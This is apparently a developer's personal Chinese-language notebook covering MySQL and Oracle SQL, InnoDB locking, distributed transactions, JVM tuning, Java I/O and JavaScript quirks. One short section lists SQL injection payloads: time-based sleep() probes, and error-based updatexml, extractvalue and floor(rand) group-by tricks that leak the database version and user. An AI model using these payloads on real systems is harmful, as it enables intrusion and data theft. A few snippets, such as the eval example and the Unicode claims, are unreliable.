innodb_lock_wait_timeout

innodb还提供了wait-for graph算法来主动进行死锁检测
当节点1需要等待节点2的资源时,就生成一条有向边指向节点2,最后形成一个有向图我们只要检测这个有向图是否出现环路即可

避免死锁
以固定的顺序访问表和行对id列表先排序,后执行,这样就避免了交叉等待锁的情形
大事务拆小
为表添加合理的索引

select @@global.tx_isolation 隔离级别
--------------------------------------------------------------------------------------
innodb对于主键使用了聚簇索引,这是一种数据存储方式,表数据是和主键一起存储
,主键索引的叶结点存储行数据

对于普通索引,其叶子节点存储的是主键值

--------------------------------------------------------------------------------------
show engine innodb status;
innodb_thread_concurrency 线程并发数

latest detected deadlock:最近检测死锁信息

--------------------------------------------------------------------------------------
mysql正则
select *
from db_ap_rgsh_vertify_log_100_201601
where channel_id regexp '.ec'

select  'abc' regexp 'a$';
--------------------------------------------------------------------------------------
last_insert_id()
最近一次insert语句在自增列上自动生成的第一个值

--------------------------------------------------------------------------------------
json乱码
@RequestMapping(value="/book/getBook.do", produces = "text/html;charset=UTF-8")
--------------------------------------------------------------------------------------
string是线程安全
string内部存储字符串的char数组以及和char数组相关的信息都是final的,这就保证了string对象生成的那一刻他在内存里就是不可变的

--------------------------------------------------------------------------------------
getParameter()获取通过HTTP协议提交过来的请求参数,getAttribute()获取存在于web容器中的request范围内的参数
getParameter()的返回值是String类型,getAttribute()的返回值是Object类型
页面A中通过链接访问页面B,在页面B中可以通过getParameter()获取请求参数,但如果页面A通过转发访问到页面B,则在页面B中只能通过getAttribute()获取参数
--------------------------------------------------------------------------------------
解决jstl标签不起作用
<%@ page  isELIgnored="false"%>
--------------------------------------------------------------------------------------
https://github.com/torakiki/sejda pdf库 AGPLV3协议
--------------------------------------------------------------------------------------
-Dmaven.javadoc.skip=true
-Dmaven.test.skip=true
--------------------------------------------------------------------------------------
配置overlay用于覆盖从属项目的同名文件,
如果我主项目中存在与cas-server-webapp项目相同目录并且相同名称的文件,已主项目的为准,
也就是覆盖从属项目的文件
<plugins>
    <plugin>
        <groupId>org.apache.maven.plugins</groupId>
        <artifactId>maven-war-plugin</artifactId>
        <configuration>
            <overlays>
                <overlay>
                    <groupId>org.jasig.cas</groupId>
                    <artifactId>cas-server-webapp</artifactId>
                </overlay>
            </overlays>
        </configuration>
    </plugin>
</plugins>
--------------------------------------------------------------------------------------
删除中间的*
str.replaceAll("(^\\*)|(\\*$)|\\*", "$1$2"); 匹配字符串开始处的 * 结尾的*
str.replaceAll("(?<!^)\\*+(?!$)", ""); 前一个位置不是行首 后一个不是行尾
--------------------------------------------------------------------------------------
spring
PropertiesLoaderUtils.loadAllProperties(fileName)
--------------------------------------------------------------------------------------
https://github.com/cyberterror/Java_Parse_IP_Range
https://github.com/exbin/xbup-tools-java
https://github.com/jaredkoontz/GeoHashesInPolygon
https://github.com/macroing/CEL4J-Java-Binary
https://github.com/changmingxie/tcc-transaction
--------------------------------------------------------------------------------------
TCC (Try-Confirm-Cancel) 模式
Try: 尝试执行业务
完成所有业务检查（一致性）
预留必须业务资源（准隔离性）

Confirm: 确认执行业务
真正执行业务
不作任何业务检查
只使用Try阶段预留的业务资源
Confirm操作满足幂等性

Cancel: 取消执行业务
释放Try阶段预留的业务资源
Cancel操作满足幂等性

三个动作都由一个事务上下文的ID来关联

--------------------------------------------------------------------------------------
ESB事务
ACID 原子性 一致 隔离 持久
分布式
无状态

--------------------------------------------------------------------------------------
分布式事务
一种是两段式事务

一种是使用冲正交易
需要用户专门开发一个服务对应的冲正服务来回滚这个服务已经提交的数据,这就使得当前分布事务还没有提交的情况下,这个事务结点的本地事务已经提交了
没有办法满足事务的隔离性

两阶段提交协议是阻塞协议,执行过程中需要锁住其他更新,且不能容错

两阶段提交缺点:
同步阻塞问题 (事务阻塞)
单点故障 (协调者宕机导致的参与者处于阻塞状态的问题)
数据不一致  发送commit请求局部网络异常或者在发送commit请求过程中协调者发生了故障

三阶段提交协议
引入超时机制
CanCommit
PreCommit
DoCommit

--------------------------------------------------------------------------------------
mysql
select isnull(null),isnull('null'),isnull(1) 是否为空
ifnull(expr1,expr2) 若expr1为null,则返回expr2的值
nullif(expr1,expr2) 若expr1等于expr2,则返回null,否则返回expr1

保留2位小数
select cast(12345.555 as decimal(15,2))
select round(12345.554,2)
--------------------------------------------------------------------------------------
常用备份工具
mysql复制
逻辑备份(mysqldump,mydumper)
物理备份(copy,xtrabackup)

mysqldump备份数据时是将所有sql语句整合在同一个文件中；
mydumper备份数据时是将SQL语句按照表拆分成单个的sql文件,每个sql文件对应一个完整的表
https://launchpad.net/mydumper/

物理备份：拷贝即可用,速度快
copy:直接拷贝文件到数据目录下,可能引起表损坏或者数据不一致
xtrabackup对于innodb表是不需要锁表的,对于myisam表仍然需要锁表
xtrabackup利用innodb的crash recovery的原理

mysqldump来说是需要锁表的,除了–single-transaction单独使用的时候是不需要锁表的

mysqldump会对该表添加read表级锁,直到该表数据备份完毕,才会释放锁
添加 -single-trasaction参数
首先将数据库的隔离级别设置为RR模式,然后发出start trasaction语句,开启事务,
最后开始备份数据,期间无需锁表

myloader是MySQL多线程的恢复工具

--------------------------------------------------------------------------------------
alter table xxx1 discard tablespace; 让mysql自己删掉ibd文件  不支持分区表 具有外键关系的时候需要将 foreign_key_check设置为0
flush tables xxxx1,xxxx2 for export;把内存的脏数据刷到磁盘
alter table xxx1 import tablespace 导入数据文件
--------------------------------------------------------------------------------------
常见SQL注入参考案例：
select *
  from db_ap_rgsh_vertify_log_100_201601
 where logid='14568797185460000001'
    or (if(now() = sysdate(), sleep(5), 1))
    or prov_code like '1 = 1';

select *
  from db_ap_rgsh_vertify_log_100_201601
 where logid in
       ('14568797185460000001' and (select * from (select (sleep(2))) a));

select *
  from db_ap_rgsh_vertify_log_100_201601
 where logid in
       ('14568797185460000001',
        (select (case
                  when (5 = 5) then
                   sleep(1)
                  else
                   0.1 * (select 1 from information_schema.character_sets)
                end)));

--dump key
select count(*), (floor(rand(0) * 2)) x
  from information_schema.tables
 group by x;

mysql的bug的主要问题是获取的值不确定又可重复同时又要来操作结果
主要是rand和group+by的冲突,不可以作为order by的条件字段， 同理也不可以为group by

order by 后面不可以跟union
select 2, rand(0)
  from db_ap_rgsg_mb_work_order
  order by rand()
union
select 1

--查出版本号
select count(*), concat(version(), floor(rand(0) * 2)) x
  from information_schema.tables
 group by x

select updatexml(1,concat(0x7e,(version())),0)

 select *
   from db_ap_plcy_fileinfo
  where 1 = 1
    and 1 = (updatexml(0x3a, concat(1, (select user())), 1))


--报错
select extractvalue(1,concat(0x5c, 'ab'))

--------------------------------------------------------------------------------------
传输数据编码：Transfer-Encoding 分段
有效的值为：Trunked和Identity

传输内容编码：Content-Encoding 压缩
gzip,compress,deflate和identity

传输内容格式：Content-Type

内容长度：Content-Length
--------------------------------------------------------------------------------------
较小堆引起的碎片问题
-XX:+UseCMSCompactAtFullCollection：使用并发收集器时,开启对年老代的压缩
-XX:CMSFullGCsBeforeCompaction=0：上面配置开启的情况下,这里设置多少次Full GC后,对年老代进行压缩

-XX:+UseParallelGC:设置并行收集器
-XX:+UseParalledlOldGC:设置并行年老代收集器
-XX:+UseConcMarkSweepGC:设置并发收集器

-Xms:初始堆大小
-Xmx:最大堆大小
-XX:NewSize=n:设置年轻代大小
-XX:NewRatio=n:设置年轻代和年老代的比值如:为3,表示年轻代与年老代比值为1：3,年轻代占整个年轻代年老代和的1/4
-XX:SurvivorRatio=n:年轻代中Eden区与两个Survivor区的比值注意Survivor区有两个如：3,表示Eden：Survivor=3：2,一个Survivor区占整个年轻代的1/5
-XX:MaxPermSize=n:设置持久代大小

CMS – 面向响应时间优化
Parallel GC – 面向吞吐量优化
java7,java8 server模式 – 默认ParallelGC
--------------------------------------------------------------------------------------
Firefox默认只在内存中缓存HTTPS只要头命令中有Cache-Control: Public,缓存就会被写到硬盘上
IE只要http头允许就可以缓存https内容,Cache-Control: max-age=600
缓存策略与是否使用HTTPS协议无关

Https的作用
内容加密 建立一个信息安全通道,来保证数据传输的安全；
身份认证 确认网站的真实性
数据完整性 防止内容被第三方冒充或者篡改

http默认使用80端口,https默认使用443端口

数字签名只能验证数据的完整性
--------------------------------------------------------------------------------------
ssl 安全套接字层
SSL记录协议
它建立在可靠的传输协议（如TCP）之上,为高层协议提供数据封装、压缩、加密等基本功能的支持

SSL握手协议（SSL Handshake Protocol）：
它建立在SSL记录协议之上,用于在实际的数据传输开始前,通讯双方进行身份认证、协商加密算法、交换加密密钥

TSL 传输层安全协议
用于两个应用程序之间提供保密性和数据完整性

SSL/TSL协议作用：
认证用户和服务器,确保数据发送到正确的客户机和服务器；
加密数据以防止数据中途被窃取；
维护数据的完整性,确保数据在传输过程中不被改变

SSL协议在握手阶段使用的是非对称加密,在传输阶段使用的是对称加密
--------------------------------------------------------------------------------------
web.xml中
<context-param>设置的是一个在应用中全局（ServletContext范围内）可见的参数,
而<init-param>设置的是一个在应用中局部（ServletRequest范围内）可见的参数
--------------------------------------------------------------------------------------
直接输出流数据使用resp.getOutputStream() 省掉一些不变字符数据编码
--------------------------------------------------------------------------------------
junit 顺序
@FixMethodOrder(MethodSorters.DEFAULT)
默认顺序由方法名hashcode值来决定,如果hash值大小一致,则按名字的字典顺序确定

@FixMethodOrder(MethodSorters.NAME_ASCENDING)

--------------------------------------------------------------------------------------
类初始化
执行失败了,抛了一个未被捕获的异常,这个类的状态设置为initialization_error,且无法再恢复

--------------------------------------------------------------------------------------
top -Hp <pid> 进程里所有线程的cpu消耗情况
jstack <pid>
--------------------------------------------------------------------------------------
undefined是派生自null
[] == 0; //===================true
[] == false; //===============true
[] == undefined; //===========false
[] == null; //================false
[] == ''; //==================true
0 == false; //================true
0 == undefined; //============false
0 == null; //=================false
0 == ''; //===================true
false == undefined; //========false
false == null; //=============false
false == ''; // ==============true
false == 'false'; //==========fasle
undefined == null; //=========true
undefined == ''; // ==========false
undefined == 'undefined'; //==false
null == ''; //================false

数字和字符串、布尔类型、数组进行比较时,字符串（或布尔类型、或数组）先转换为数字（Number）,再进行比较
123 == '123asd'; //false
123 == '123'; //true
123 == false; //false
123 == true; //false

使用 if(num) 和 if(num == true) 结果不一样前者使用Boolean()转换Num, 后者使用Number转换true

所有对象转换为Bool类型都为true,只有以下几个数值转换为Bool为false: undefined/null/0/NAN/""
Boolean(new Boolean(false)); // true

原始数据类型转换为字符串,相当于直接把原数据用引号包起来

字符串转数值,能解析的返回数值,不能解析的返回NAN
Number(true); // 1
Number(false); //0

Number('undefined'); // NAN
Number(undefined) //NaN
Number({a: 2}); // NAN

Number(null); // 0

数组（或对象）和字符串进行比较时,数组（或对象）会转换成字符串再进行比较
var obj = {a: 1};
obj == "[object Object]"; //true

typeof null; //object

null是关键字,undefined不是关键字



var num = 3.1415926;
num = num.toFixed(n); //保留n位小数,返回字符串

只想要地址内容换行其他不换行：td{white-space: nowrap;}  table tr>td:nth-child(6){white-space:normal;}

$('.a').eq(1) // 选择了第二个a,是jq对象（不可以使用dom属性方法,可以用jq的属性、方法）
$('.a')[1]  // 选择了第二个a,是dom对象（可以使用dom属性,方法,不可以使用jq属性方法）

var o = {};
var a = { x: 10 };
o.a = a;
delete o.a;    // o.a属性被删除
o.a;           // undefined
a.x;           // 10, 因为{ x: 10 } 对象依然被 a 引用,所以不会被回收

拥有DontDelete内部属性的变量表明该变量不能使用 delete 操作符删除
prototype中声明的属性就无法被delete
对象的预定义属性也无法删除
var re = /abc/i;
delete re.ignoreCase;
re.ignoreCase;

通过var声明的变量和通过function声明的函数拥有DontDelete特性,无法被删除 eval例外
eval("var x = 36;");
x;     // 42
delete x;
x;     // undefined
--------------------------------------------------------------------------------------
oracle +interval 函数  年、月、日、时、分、秒
select sysdate+interval '2' hour  from dual;

select interval '120' month(3) from dual;--显示结果的精度

select trunc(sysdate)+interval '2 12:00:59' day to second from dual;--日-秒

select trunc(sysdate)+interval '1-3' year to month from dual;--年-月


numtodsinterval函数,用于将整数转换成时间值date类型的日、时、分、秒(day,hour,minute,second)
select trunc(sysdate)+numtodsinterval(100, 'second') from dual--+100s

numtoyminterval函数,用于将整数转换成时间值date类型的年、月
select trunc(sysdate)+numtoyminterval(2, 'month') from dual;

显示星期
select to_char(sysdate, 'day', 'NLS_DATE_LANGUAGE=''SIMPLIFIED CHINESE''')
  from dual;

select to_char(sysdate, 'day', 'NLS_DATE_LANGUAGE = American')
 from dual;


oracle相同记录合并
select code_type,
       listagg(code_value, ',') within GROUP(order by code_value) code_value
  from bs_static_data
 where length(code_value) < 20
 group by code_type

count分组统计
select name,
       create_date,
       total_num,
       count(*) over(partition by name, trunc(create_date), total_num) counts
  from tmp_tbl_count

select rownum from dual connect by rownum <= 10 -- 1,2,3,4,5,6,7,8,9,10

oracel临时表
只在会话期间或在事务处理期间存在的表.
临时表在插入数据时，动态分配空间

create global temporary table temp_global_tb
   (id number,
   name varchar2(10))
   on commit delete rows;
insert into temp_global_tb values(10,'ABC');
commit;
select * from temp_global_tb; --无数据显示,数据自动清除
   on commit preserve rows:在会话期间表一直可以存在（保留数据）
   on commit delete rows:事务结束清除数据（在事务结束时自动删除表的数据）

返回表达式所需的字节数
select vsize('测') from dual;

返回字符串首字母的Ascii值
select ascii('才') from dual

返回ascii值对应的字母
select chr(ascii('才')) from dual

去掉前导和后缀
select trim(leading 9 from 9998767999) s1,
       trim(trailing 9 from 9998767999) s2,
       trim(9 from 9998767999) s3
  from dual;

查找月的第一天,最后一天
select trunc(trunc(sysdate, 'month') - 1, 'month') first_day_last_month,
       trunc(sysdate, 'month') - 1 / 86400 last_second_last_month,
       trunc(sysdate, 'month') first_day_cur_month,
       last_day(trunc(sysdate, 'month')) + 1 - 1 / 86400 last_second_cur_month,
       last_day(trunc(sysdate, 'month')) last_day_cur_month
  from dual;

从当前开始下一个星期五 1表示星期日
select next_day(sysdate,6)
from dual

今年天数
select add_months(trunc(sysdate, 'year'), 12) - trunc(sysdate, 'year')
  from dual


select '201109' || lpad(rownum,2,'0') as days,
       to_char(to_date('201109' || rownum, 'yyyymmdd'),
               'day',
               'NLS_DATE_LANGUAGE=''SIMPLIFIED CHINESE''') as week
  from dual
connect by rownum <=
           cast(to_char(last_day(to_date('201109', 'yyyymm')), 'dd') as int)


--------------------------------------------------------------------------------------
var dt = new Date();
var date = [
  [dt.getFullYear(), dt.getMonth() + 1, dt.getDate()].join('-'),
  [dt.getHours(), dt.getMinutes(), dt.getSeconds()].join(':')
].join(' ').replace(/(?=\b\d\b)/g, '0'); // 正则补零
console.log(date);

var date="2016-03-04 12:09:00";
var dateTime=new Date(date.replace("-","/")).getTime();

--------------------------------------------------------------------------------------
js 声明提升
console.log(a); // undefined
var a = 1;

声明变量通常是局部的,未声明变量通常全局的

function testOrder(arg) {
    console.log(arg); // arg是形参,不会被重新定义
    console.log(a); // 因为函数声明比变量声明优先级高,所以这里a是函数
    var arg = 'hello'; // var arg;变量声明被忽略, arg = 'hello'被执行
    var a = 10; // var a;被忽视; a = 10被执行,a变成number
    function a() {
        console.log('fun');
    } // 被提升到作用域顶部
    console.log(a); // 输出10
    console.log(arg); // 输出hello
};
testOrder('hi');

--------------------------------------------------------------------------------------
function fun(n,o) {
    console.log(o);
        return {
            fun:function(m) {
                return fun(m,n);
            }
        };
}
var a = fun(0); a.fun(1);  a.fun(2);  a.fun(3);

var a = fun(0) ;
等同于fun(0, undefined),因为未传递第二参数,所以打印 undefined ；

a.fun(1);=fun(0, undefined).fun(1) 闭包 fun(1, 0)

var b = fun(0)
从这来看,和第一行暂时一样,打印 undefined ；
.fun(1)
此时和第一行第二步也是一样,返回 fun(1, 0) , 打印 0 ；
.fun(2)
这一步其实已经变为fun(1, 0) .fun(2) ,返回的是 fun(2, 1) 所以打印值为1；

--------------------------------------------------------------------------------------
b=[1,2,3,4].slice(0);返回新数组
--------------------------------------------------------------------------------------
var param = 1;

function main()
{
    console.log(param);
    var param = 2;
    console.log(this.param);
    this.param = 3;
}

main();// undefined(声明提前),1(this指向window)
var m = new main();// undefined ,undefined(this指向m)

对象中的this指向创建的对象
直接调用函数时的this指向window对象
构造函数this事指向当前实例化对象的
--------------------------------------------------------------------------------------
当鼠标指针离开被选中元素时才能触发mouseleave事件
--------------------------------------------------------------------------------------
开发中建议使用jQuery Migrate的开发版,可以在浏览器控制台上打印出来不兼容的地方详细信息
--------------------------------------------------------------------------------------
Excel
=if(exact(a2,b2)=true,"相同","不同")--不区分大小写
=if(countif(a:a,b1)=0,"不重复","")

a列的数据没有在b列出现过
=if(iserror(match(a1,$b$1:$b$5,0)),"",a1)
--------------------------------------------------------------------------------------
mysql更新自己
update tb_vobile a join (select max(id) id from tb_vobile) b on a.id = b.id
   set a.name = '123 ';

utc时间
select utc_date(), utc_time(), utc_timestamp()

select extract(year from now()),year(now());

时区转换
select convert_tz('2016-08-08 12:00:00', '+08:00', '+00:00');--转为utc
select date_sub('2016-08-08 12:00:00', interval 8 hour);

进制转换
select conv(32,10,16)

保存16进制数据
select char(1209), hex(char(1209)),conv(hex(char(1209)),16,10)

select ascii('m'),char(ascii('m'))  109 m

gbk转utf-8
select hex(convert('寰堝睂' using gbk));
select convert(0xE5BE88E5B18C using utf8)


区分大小写
select *
  from db_ap_rgsh_vertify_log_100_201601
 where channel_id = binary 'Wechat';

mysql递减
select @cdate := date_add(@cdate, interval - 1 day) days
  from (select @cdate := curdate() from dual limit 10) t1

mysql group_concat大小限制
show variables like 'group_concat_max_len'

每门大于80
select distinct name
  from chengji
 where name not in (select distinct name from chengji where fenshu <= 80)

推荐
select distinct name
  from #test a
 where not exists (select *
          from #test
         where a.name = name
           and mark < 80)


select name from #test group  by name having min(mark)>80

排名前5
select *
  from t_stu a
 where 5 > (select count(*)
              FROM t_stu
             where gender = a.gender
               AND grade > a.grade)
 order by a.gender,a.grade desc

select *
  from (select s.*,
               dense_rank() over(partition by s.gender order by s.grade desc) dro
          from t_stu s) t
 where t.dro <= 5

--------------------------------------------------------------------------------------
参数能代码处理的不用用数据库
select a,
       max(b) as b,
       substr(concat(event_date, event_time), 1, 12) as tran_time
  from tablename
 where event_date >= :start_date
   and event_time >= :start_time
   and event_date <= :end_date
   and event_time < :end_time
   and a = :a
 group by a, tran_time
 order by a, tran_time asc

--------------------------------------------------------------------------------------
maven多模块 管理依赖和插件
maven提供dependencyManagement和pluginManagement两个标签

--------------------------------------------------------------------------------------
openssl pkcs8 -topk8 -nocrypt -inform PEM -in rsa_private_key.pem -outform PEM outform
--------------------------------------------------------------------------------------
查询选修了所有选修课程的学生
select stu.id, stu.name
  from s stu
 where (select count(sid) from sc where sid = stu.id) =
       (select.count(id) from c);

查出每个部门高于部门平均工资的员工名单
select ta.*
  from employee ta,
       (select deptid, avg(salary) avgsal from employee group by deptid) tb
 where ta.deptid = tb.deptid
   and ta.salary > tb.avgsal

工资高于本部门的平均工资的员工数和部门号
select ta.deptid, count(*) as ‘人数’
  from employee ta,
       (select deptid, avg(salary) avgsal from employee group by deptid) tb
 where ta.deptid = tb.deptid
   and ta.salary > tb.avgsal
 group by ta.deptid
 order by ta.deptid

--------------------------------------------------------------------------------------
mysql分页
id为数字
select *
  from address
 where id >= (select id from address order by id limit 10000000, 1) limit 10

select *
  from test as t1
  join (select id from test order by id desc limit 180, 1) as t2
 where t1.id <= t2.id
 order by t1.id desc limit 10


提前算好最小id 将本次查出的结果集中的最大的 id,自增 1 后作为下次查询的 minId(不能跨页)
select *
  from address
 where id >= #minid#
 limit 10

第一次先查出目标分页的 id 集合 通过id查记录

从业务上解决,限制查询页数
--------------------------------------------------------------------------------------
mysql星期
select dayofweek(now()),dayname(now()),weekday(now()); dayofweek(1=星期天 2=星期一) weekday(0表示星期一,1表示星期二)

select dayofmonth(now()),monthname(now());  月份第*天

--------------------------------------------------------------------------------------
Enum.class -->Enum
Enum.class.getClass()-->Class 该方法只能由类的实例变量调用 返回该对象的运行时类的java.lang.Class对象
--------------------------------------------------------------------------------------
mysql
connect_timeout:在获取连接阶段(authenticate)起作用
interactive_timeout和wait_timeout:在连接空闲阶段(sleep)起作用
net_read_timeout和net_write_timeout:则是在连接繁忙阶段(query)起作用

net_read_timeout
在终止读之前,从一个连接获得数据而等待的时间秒数；当服务正在从客户端读取数据时,net_read_timeout控制何时超时

net_write_timeout
在终止写之前,等待多少秒把block写到连接；当服务正在写数据到客户端时,net_write_timeout控制何时超时

interactive_timeout
与服务器端无交互状态的连接,直到被服务器端强制关闭而等待的时间

connect_timeout
连接超时

wait_timeout
等待超时 等用户的请求(query) session级别

select @@sql_mode;
NO_ZERO_IN_DATE 和 NO_ZERO_DATE 两个值,限制字段不能为零日期
--------------------------------------------------------------------------------------
https://github.com/dvimont/ordered-set
https://github.com/advantageous/reakt
https://github.com/dragon66/icafe
--------------------------------------------------------------------------------------
ISO 8859-1,属于单字节编码,应用于英文系列最多能表示的字符范围是0-255 无法表示中文字符
把其他任何编码的字节流当作ISO-8859-1编码看待都没有问题

Unicode是最统一的编码,可以用来表示所有语言的字符,而且是定长双字节编码
Unicode是一种编码方式 符号集,它只规定了符号的二进制代码
UTF是一种存储方式 UTF-8是Unicode的实现方式之一

UTF-32 4字节
UTF-16 UTF16-LE(小端)和UTF16-BE(大端)   变长码 基本平面的字符占用2个字节,辅助平面的字符占用4个字节
2个字节（U+0000到U+FFFF）
4个字节（U+010000到U+10FFFF）(增补字符)

H = Math.floor((c-0x10000) / 0x400)+0xD800 高代理项
L = (c - 0x10000) % 0x400 + 0xDC00 低代理项

UTF-8 可以用来表示所有语言的字符 可变字节

UTF-16
编码效率最高 适合在本地磁盘和内存之间使用,可以进行字符和字节之间快速切换,
如 Java 的内存编码就是采用 UTF-16 编码 Java里使用的是UTF-16BE方式来存储数据的

UTF-8 没有字节序的概念 适合网络传输

解读UTF-8编码非常简单如果一个字节的第一位是0,则这个字节单独就是一个字符；如果第一位是1,则连续有多少个1,就表示当前字符占用多少个字节

3个字节的UTF-8十六进制编码一定是以E开头的
2个字节的UTF-8十六进制编码一定是以C或D开头的
1个字节的UTF-8十六进制编码一定是以比8小的数字开头的

UTF-16包括三种：UTF-16,UTF-16BE(Big Endian),UTF-16LE(Little Endian)
UTF-16就需要通过在文件开头以名为BOM（Byte Order Mark）的字符

组合字符
--------------------------------------------------------------------------------------
String.length()返回的是char的个数,而不是字符串真正包含的字符个数
String.codePointCount(), 此方法可以处理在有增补字符的情况下返回真正字符的个数
--------------------------------------------------------------------------------------
mysql单表最大4096列 一条记录最大的长度是65535字节

--------------------------------------------------------------------------------------
getClass()
所有Java对象都具备这个方法,该方法用于返回调用该方法的对象的所属类关联的Class对象
getClass()是运行程序时动态加载

List list = new ArrayList();
System.out.println(list.getClass().getName()); // java.util.ArrayList

使用类名加".class"的方式即会返回与该类对应的Class对象
可以直接获得与指定类关联的Class对象,而并不需要有该类的对象存在

--------------------------------------------------------------------------------------
long和double都不是线程安全的
volatile能够用于控制可见性,通常对于标志,例如线程退出标志等使用volatile


synchronized的两个语意,1原子性 2内存可见性, synchronized还是可重入的锁

--------------------------------------------------------------------------------------
Oracle如何通过JDBC看到执行计划

常用于调试线上的bug,jdbc连接可重现,数据库连接不可重现的问题
oracle = ConnectionManager.getConnection(ConnectionManager.Test);
stmt = oracle.createStatement()
stmt.execute("explain plan for SELECT   1 from Dual");
rs = stmt.executeQuery("select plan_table_output from table(dbms_xplan.display())");
while (rs.next())
{
  System.out.println(rs.getString(1));
}

--------------------------------------------------------------------------------------
CAS实现原理
CAS操作需要输入两个数值,一个旧值（期望操作前的值）和一个新值,
在操作期间先比较下在旧值有没有发生变化,如果没有发生变化,才交换成新值,
发生了变化则不交换

缺点
ABA问题 解决思路就是使用版本号
只能保证一个共享变量的原子操作 AtomicReference类来保证引用对象之间的原子性

--------------------------------------------------------------------------------------
Spring AOP默认使用的是JDK的Proxy
public void methodB() {
    this.methodA(); 静态编译
}
--------------------------------------------------------------------------------------
如何查看线上的Java进程使用的GC收集器类型
jinfo 结果中有+号则使用这种收集器,否则有-号表示没有使用这个收集器
jinfo -flag UseParallelGC 1704
jinfo -flags 1704

打印系统属性
jinfo -sysprops 1704
--------------------------------------------------------------------------------------
两种I/O多路复用模式：Reactor(反应器)和Proactor
Reactor模式采用同步IO,而Proactor采用异步IO

Reactor模式中,会先对每个client注册感兴趣的事件,然后有一个线程专门去轮询每个client是
否有事件发生,当有事件发生时,便顺序处理每个事件,当所有事件处理完之后,
便再转去继续轮询

在Proactor模式中,当检测到有事件发生时,会新起一个异步操作,然后交由内核线程去处理,
当内核线程完成IO操作之后,发送一个通知告知操作已完成,
异步IO模型采用的就是Proactor模式

IO边缘触发,水平触发
水平触发,一次不管来了多少数据,只要调用了pool, select,只要有数据剩余就会返回,就可以继续读,
比如,一次来了1k,第一次读了512字节,再调用还会返回512字节,第二次调用后,立即返回

边缘触发,一次不管来了多少数据,只要调用了epool,即使有数据剩余,再次调用读取数据都不会返回,
知道有新的数据进来,再继续读,比如,一次来了1k,第一次读了512字节,再调用也不会返回那512字节
,等有新的数据产生的时候,会返回,从上次512字节进行读取

IO操作
基于字节操作的 I/O 接口：InputStream 和 OutputStream
基于字符操作的 I/O 接口：Writer 和 Reader
基于磁盘操作的 I/O 接口：File
基于网络操作的 I/O 接口：Socket

IO的阻塞、非阻塞主要表现在一个IO操作过程中,当前IO进程是否等待操作完成
我从硬盘读取数据,然后程序一直等,数据读完后,继续操作叫阻塞IO
我从硬盘读取数据,然后程序继续向下执行,等数据读取完后,通知当前程序,非阻塞IO
非阻塞 线程切换的增加 增加 CPU 消耗

判断同步和异步：一个IO操作直到完成,是否导致程序进程的阻塞阻塞就是同步的,没有阻塞就是异步的
同步和异步关注的是消息通信机制
同步:调用者主动等待调用的结果
异步:调用发出后,调用者不会立刻得到结果,被调用者通知调用者

同步能够保证程序的可靠性,而异步可以提升程序的性能


同步和异步 描述的是用户线程与内核的交互方式
同步是指用户线程发起 I/O 请求后需要等待或者轮询内核 I/O 操作完成后才能继续执行；
异步是指用户线程发起 I/O 请求后仍继续执行,当内核 I/O 操作完成后会通知用户线程
同步IO和异步IO的关键区别反映在数据拷贝阶段是由用户线程完成还是内核完成

阻塞和非阻塞 用户线程调用内核 I/O 操作的方式
阻塞是指 I/O 操作需要彻底完成后才返回到用户空间；
非阻塞是指 I/O 操作被调用后立即返回给用户一个状态值,无需等到 I/O 操作彻底完成

一个 I/O 操作分成了两个步骤：发起 I/O 请求(阻塞)和实际的 I/O 操作(同步)
1)查看数据是否就绪；
2)进行数据拷贝（内核将数据拷贝到用户线程）

同步阻塞 一个连接一个线程 (改进:线程池)
同步非阻塞 一个请求一个线程(NIO)
异步阻塞
异步非阻塞 AIO 一个有效请求一个线程 java7

IO模型
阻塞IO 读写数据过程中会发生阻塞现象
非阻塞IO 用户线程需要不断地询问内核数据是否就绪
多路复用IO NIO 通过轮询的方式来检测是否有事件到达 对到达的事件逐一进行响应
信号驱动IO 用户线程接收到信号之后,便在信号函数中调用IO读写操作来进行实际的IO请求操作
异步IO IO操作的两个阶段都不会阻塞用户线程 两个阶段都是由内核自动完成
--------------------------------------------------------------------------------------
ByteBuffer主要有两个继承的类分别是：HeapByteBuffer和MappedByteBuffer
HeapByteBuffer会在JVM的堆上分配内存资源
MappedByteBuffer的资源则会由JVM之外的操作系统内核来分配

DirectByteBuffer继承了MappedByteBuffer,采用了直接内存映射的方式,将文件直接映射到虚拟内存
在处理大文件方面有很大的性能优势 文件句柄一直被占用而无法删除的情况

netty中使用ChannelBuffer来处理读写

netty零拷贝
netty的接收和发送ByteBuffer采用Direct Buffer 使用堆外直接内存
netty的文件传输采用了transferTo方法
netty允许将多段数据合并为一整段虚拟数据供用户使用 CompositeChannelBuffer (版本3)
--------------------------------------------------------------------------------------
java序列化问题
java内部的一种对象编解码技术,无法跨语言使用
序列化后太大
序列化性能差
--------------------------------------------------------------------------------------
CQRS axon
--------------------------------------------------------------------------------------
https://github.com/katharsis-project/katharsis-core

https://github.com/codice/imaging-nitf ntf解析
https://github.com/zazuko/jsonldparser

https://github.com/gvsmirnov/java-perv --
https://github.com/navdeep-G/timeseries-java
https://github.com/vrachieru/cnp4j
--------------------------------------------------------------------------------------
-Djava.security.egd=file:/dev/./urandom
--------------------------------------------------------------------------------------
jvm
-XX:+PrintGCApplicationStoppedTime 打应垃圾收集时,系统的停顿时间
-XX:+PrintGCDetails  打应垃圾收集的情况
-XX:+PrintGCApplicationConcurrentTime GC之间运行了多少时间

频繁GC
频繁实例化对象,Release对象
Heap太小

应用程序线程可以被安全地停止掉的那个时间点,就叫做安全点
Stopping threads took:等待所有的应用线程都到达安全点

打印引起SafePoint的操作、线程运行情况
-XX:+PrintSafepointStatistics
-XX:PrintSafepointStatisticsCount=1

no vm operation 保证安全点,JVM默认每秒会触发一次安全点来处理那些非紧急的排队的操作

保存jvm日志
-XX:+UnlockDiagnosticVMOptions   -XX:+LogVMOutput -XX:LogFile=e:/test_tmp/vm.log

-verbose:gc 表示输出虚拟机中GC的详细情况
[Full GC 168K->97K(1984K), 0.0253873 secs]
-XX:+PrintGC 与 -verbose:gc 是一样的
--------------------------------------------------------------------------------------
CMS收集器：暂停时间优先
配置参数：-XX:+UseConcMarkSweepGC

Parallel收集器：吞吐量优先
配置参数： -XX:+UseParallelGC -XX:+UseParallelOldGC(

G1将老年代分成若干个区,将回收分成多个阶段 每次回收可以优先回收可能比较多的不可达对象的区,达到响应时间可配置,可以指定最大停顿时间,也就是响应时间可控是它的主要特点
--------------------------------------------------------------------------------------
查看新生对象晋升老年代的实际阈值 -XX:+PrintTenuringDistribution

MaxTenuringThreshold这个参数用于控制对象能经历多少次Minor GC才晋升到旧生代,默认值是15
-XX:MaxTenuringThreshold=2

--------------------------------------------------------------------------------------
